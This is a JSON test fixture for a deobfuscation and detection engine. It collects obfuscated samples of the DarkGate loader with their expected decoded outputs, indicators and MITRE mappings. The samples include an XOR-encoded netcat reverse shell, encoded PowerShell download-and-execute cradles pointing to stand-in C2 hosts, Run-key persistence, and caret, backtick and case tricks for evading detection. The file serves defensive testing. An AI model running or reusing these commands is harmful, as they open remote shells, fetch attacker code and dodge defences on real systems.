@@ -1,0 +1,560 @@
+{
+  "family_id": "darkgate",
+  "family_display_name": "DarkGate",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "DarkGate (MehCrypter / Meh) commodity multi-stage loader. Distributed via phishing, SEO poisoning, and malicious ads. This pack covers the PowerShell + CMD + XOR sides that the Convergence Engine handles deterministically. AutoIT / AutoHotkey / VBScript sides are declared explicit coverage gaps until a future script-language decoder pass lands.",
+  "primary_mitre_attack": [
+    "T1059.001",
+    "T1059.003",
+    "T1027",
+    "T1027.010",
+    "T1140",
+    "T1105",
+    "T1547.001",
+    "T1564.003"
+  ],
+  "primary_behaviors": [
+    "download_and_execute",
+    "byte_array_xor_decode",
+    "cmd_to_ps_handoff",
+    "obfuscated_command_line",
+    "registry_run_key_persistence",
+    "c2_beacon"
+  ],
+  "known_technique_universe": [
+    "autohotkey_script_launcher",
+    "autoit_script_extraction",
+    "backtick_alias_obfuscation",
+    "byte_array_xor_stager",
+    "cmd_caret_powershell_handoff",
+    "frombase64string_stage3_staging",
+    "iex_downloadstring_cradle",
+    "powershell_encodedcommand_stage2",
+    "random_case_obfuscation",
+    "string_concat_url_obfuscation",
+    "vbscript_wrapper"
+  ],
+  "coverage_gap_techniques": [
+    "autohotkey_script_launcher",
+    "autoit_script_extraction",
+    "vbscript_wrapper"
+  ],
+  "techniques": [
+    {
+      "id": "byte_array_xor_stager",
+      "display_name": "DarkGate Byte-Array XOR Stager",
+      "description": "DarkGate's signature technique: an integer byte array XOR'd with a single-byte key to reveal the next-stage command. Observed in every public DarkGate sample since 2023.",
+      "mitre_attack": [
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "DG001",
+          "variant": "byte_array_xor_reverse_shell",
+          "input": "0x34,0x39,0x7a,0x6e,0x6f,0x74,0x6c,0x6c,0x74,0x6d,0x6d,0x74,0x62,0x62,0x7a,0x62,0x6e,0x6e,0x69,0x7a,0x77,0x3f,0x7a,0x39,0x37,0x3e xor 0x5A",
+          "expected": {
+            "interpreter": null,
+            "final_interpreter": "cmd",
+            "decoder_chain": [
+              "xor-byte-array"
+            ],
+            "final_output_contains": [
+              "nc 45.66.77.88 8443",
+              "-e cmd"
+            ],
+            "iocs_contains": [
+              "45.66.77.88 8443"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.003"
+            ],
+            "behaviors": [
+              "byte_array_xor_decode",
+              "reverse_shell"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "e1dd25163e4df97fbb4d1179848fb8a20fd2c707ab4c4f9772e72d96329ea8bc",
+              "certificate_fingerprint": "84ab2d3d26f8227c347897c2545f4cd4eb4f81c28b6c9b527e12d3e8f2356db0",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        },
+        {
+          "id": "DG002",
+          "variant": "byte_array_xor_c2_url_reveal",
+          "input": "0x54,0x48,0x48,0x4c,0x06,0x13,0x13,0x58,0x5b,0x11,0x5f,0x0e,0x12,0x59,0x44,0x5d,0x51,0x4c,0x50,0x59,0x12,0x5f,0x53,0x51,0x13,0x5b,0x5d,0x48,0x59,0x12,0x4c,0x54,0x4c,0x03,0x55,0x58,0x01,0x0d,0x0e,0x0f,0x08 xor 0x3C",
+          "expected": {
+            "interpreter": null,
+            "final_interpreter": "generic",
+            "decoder_chain": [
+              "xor-byte-array"
+            ],
+            "final_output_contains": [
+              "http://dg-c2.example.com/gate.php"
+            ],
+            "iocs_contains": [
+              "http://dg-c2.example.com/gate.php"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1071.001"
+            ],
+            "behaviors": [
+              "byte_array_xor_decode",
+              "c2_url_reveal"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "c181fd144098cc9e77e1a07308f84fff4daa5062df19ac5bde6e10840271f273",
+              "certificate_fingerprint": "93d6a0af89b25f960b99b54bbb73687d6fc51f317cf842a3d6b2331104b824aa",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_encodedcommand_stage2",
+      "display_name": "PowerShell -EncodedCommand DarkGate Stage-2",
+      "description": "Real DarkGate stage-2: the AutoIT installer drops a batch file that launches `powershell -EncodedCommand <b64>` to retrieve stage-3 from the C2.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "DG003",
+          "variant": "powershell_encodedcommand_c2_beacon",
+          "input": "powershell -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBkAGcALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBkAGcAXwBzAHQAYQBnAGUAMwAuAHAAcwAxACcAKQApAA==",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-c2.example.com/dg_stage3.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-c2.example.com/dg_stage3.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1140",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "8a918090b8e7d830aa3b6e7b034917d60509fa5f6d2df34c7ad45f210add60a9",
+              "certificate_fingerprint": "a99cb5a301f0b0e47f89658fede14fb99ccb901653b8a91e39284bc928519e17",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        },
+        {
+          "id": "DG004",
+          "variant": "powershell_enc_hidden_dg_persistence",
+          "input": "powershell -NoP -W Hidden -Enc UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgAgAC0ATgBhAG0AZQAgAEQARwBTAHYAYwAgAC0AVgBhAGwAdQBlACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIABJAEUAWAAgACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGQAZwAtAHAALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBiAGUAYQBjAG8AbgAuAHAAcwAxACcAKQApACIA",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Set-ItemProperty",
+              "CurrentVersion\\Run",
+              "DGSvc",
+              "http://dg-p.example.com/beacon.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-p.example.com/beacon.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1547.001",
+              "T1564.003",
+              "T1105"
+            ],
+            "behaviors": [
+              "registry_run_key_persistence",
+              "download_and_execute",
+              "hidden_window",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d41e26546bcfb5eebc2a343850ee378fe7b1f6b9c558006fa3afa6820ac90135",
+              "certificate_fingerprint": "7444681fd9adb75daee7cfe3ee2f69a8f1cb787fedf2abee9d19a8f4b4296590",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "cmd_caret_powershell_handoff",
+      "display_name": "DarkGate CMD Caret \u2192 PowerShell Launcher",
+      "description": "The AutoIT-dropped batch launcher uses caret-escaped characters (`c^m^d /c p^ow^ers^he^ll`) to defeat signature-based EDR at the CMD layer.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1059.003",
+        "T1027.010",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "DG005",
+          "variant": "cmd_caret_ps_enc_darkgate_launcher",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^nc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBkAGcALQBsAGEAdQBuAGMAaAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGQAZwBfAHMAdABhAGcAZQAuAHAAcwAxACcAKQApAA==",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-launch.example.com/dg_stage.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-launch.example.com/dg_stage.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "3f9a94d47057721a28c37c2c507ec9a384b8087cadac2abe31b1092220abbb5a",
+              "certificate_fingerprint": "ec97ff8e342c0f991480969e26933ed4088067b603a4d1a2811de08b4f0088e6",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "iex_downloadstring_cradle",
+      "display_name": "DarkGate IEX DownloadString C2 Beacon",
+      "description": "Classic DarkGate stage-3 C2 beacon: `IEX ((New-Object Net.WebClient).DownloadString($c2))` retrieves the next command every N seconds.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "DG006",
+          "variant": "iex_downloadstring_c2_beacon",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString('http://dg-c2.example.com/dg_cmd.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-c2.example.com/dg_cmd.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-c2.example.com/dg_cmd.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "c2_beacon"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "00d7996461ce942d08e07e60524f395e55135606e8f77487472b259fd9574784",
+              "certificate_fingerprint": "c44fc3b5e5449e0f85cbbdf3a8129795b318dc04a39971612f4fd5ceb2ccd30f",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        },
+        {
+          "id": "DG007",
+          "variant": "iex_downloadstring_lower_get_task",
+          "input": "iex ((new-object net.webclient).downloadstring('http://dg-c2.example.com/task/get'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-c2.example.com/task/get"
+            ],
+            "iocs_contains": [
+              "http://dg-c2.example.com/task/get"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "c2_beacon"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "f8df129d83262c4509525159f13e336b94f2cce9a03520df76f02e93ad33cee1",
+              "certificate_fingerprint": "348bd657d65429513dcf33673a2f46374f09a36af2525a9aaf35dfc873d23071",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "string_concat_url_obfuscation",
+      "display_name": "DarkGate URL String-Concat Obfuscation",
+      "description": "DarkGate PowerShell stage often splits the C2 URL across multiple SQ variables and concats them at call time.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "DG008",
+          "variant": "three_var_url_split",
+          "input": "$a='ht'; $b='tp://dg-split.example.com'; $c='/get.ps1'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-split.example.com/get.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-split.example.com/get.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "4dc7ba0acda829901dd347aca26bbe23bd0e542f1180078b9808a0318ebb9604",
+              "certificate_fingerprint": "534f68a69a79a716355f21d33d02853109c7b0ffaa0810accdc4e9ef569ccf0c",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "frombase64string_stage3_staging",
+      "display_name": "[Convert]::FromBase64String Stage-3 Staging",
+      "description": "DarkGate stage-3 unpacks the final payload via `$sc = [Convert]::FromBase64String('...'); IEX $sc`.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "DG009",
+          "variant": "frombase64string_stage3",
+          "input": "$sc = [Convert]::FromBase64String('SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2RnLXN0YWdlMy5leGFtcGxlLmNvbS9kZ19maW5hbC5wczEnKSk7'); IEX $sc",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "decoder-frombase64string-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-stage3.example.com/dg_final.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-stage3.example.com/dg_final.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "shellcode_staging"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "0c1845cd6bd4e146659641a6368b789e2f0971febd4da3d4fda57e62d987d821",
+              "certificate_fingerprint": "86e4c2c0560d1f7f5df28a70b30029d91848627bd633e50f5c281059a32a6e24",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "backtick_alias_obfuscation",
+      "display_name": "DarkGate Backtick Alias Obfuscation",
+      "description": "DarkGate authors inject backtick escapes mid-identifier (`I`E`X`, `i`w`r`) to defeat EDR string matching. Observed in Malwarebytes / TrendMicro reports.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "DG010",
+          "variant": "backtick_iwr_useb_iex",
+          "input": "i`wr 'http://dg-bt.example.com/dg_bt.ps1' -useb | i`ex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://dg-bt.example.com/dg_bt.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://dg-bt.example.com/dg_bt.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "83f1c980f304108a2ef9703ac460ac6af4d9a1b13573bdb61327fbb93833ef3d",
+              "certificate_fingerprint": "adccf0fa69589aad3a4cb87abde1b243990062033d304b8b3f07eedb7a1ecad4",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "random_case_obfuscation",
+      "display_name": "DarkGate Random-Case Cmdlet Obfuscation",
+      "description": "Cmdlet and alias casing randomized to evade string-match detections.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "DG011",
+          "variant": "random_case_iex_ds",
+          "input": "iEx ((nEw-oBjeCt nEt.WebClIent).DoWnLoaDString('http://dg-case.example.com/dg_c.ps1'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://dg-case.example.com/dg_c.ps1"
+            ],
+            "iocs_contains": [
+              "http://dg-case.example.com/dg_c.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "case_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "3089b7b7c36906429823a250c20c7d76d2c615bb4cadaecfc2d7ad8ebdc58240",
+              "certificate_fingerprint": "5aab9dcb266eba23d73c044c0051566a3d9593843d79a62c740134ae7250fcaa",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:26:28+00:00"
+            }
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
